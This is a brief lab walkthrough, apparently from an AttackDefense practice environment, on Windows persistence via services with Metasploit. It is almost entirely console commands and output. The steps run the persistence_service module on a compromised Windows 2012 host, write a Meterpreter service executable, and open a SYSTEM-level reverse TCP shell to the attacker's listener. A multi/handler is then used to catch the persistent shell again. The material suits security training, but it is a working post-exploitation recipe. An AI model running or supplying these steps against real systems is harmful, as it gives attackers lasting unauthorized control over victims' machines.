# Persistence via Services

```sh
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

```sh
msf6 exploit(windows/http/rejetto_hfs_exec) > search persistence_service

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/local/persistence_service  2018-10-20       excellent  No     Windows Persistent Service Installer


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/persistence_service

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > set session 1
session => 1
msf6 exploit(windows/local/persistence_service) > set LPORT 4433
LPORT => 4433
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.26.2:4433 
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\OYOZZo.exe
[*] Creating service nJvsr
[*] Sending stage (175174 bytes) to 10.5.23.60
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240118.4849/WIN-OMCNBKR66MN_20240118.4849.rc
[*] Meterpreter session 2 opened (10.10.26.2:4433 -> 10.5.23.60:49273) at 2024-01-18 23:48:49 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```sh
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.5.23.60 - Meterpreter session 2 closed.  Reason: User exit
msf6 exploit(windows/local/persistence_service) > sessions -K
[*] Killing all sessions...
[*] 10.5.23.60 - Meterpreter session 1 closed.
msf6 exploit(windows/local/persistence_service) > exit
root@attackdefense:~# msfconsole
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 4433
lport => 4433
msf6 exploit(multi/handler) > set lhost 10.10.26.2
lhost => 10.10.26.2
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.26.2:4433 
[*] Sending stage (175174 bytes) to 10.5.23.60
[*] Meterpreter session 1 opened (10.10.26.2:4433 -> 10.5.23.60:49309) at 2024-01-18 23:54:13 +0530

meterpreter > 

```
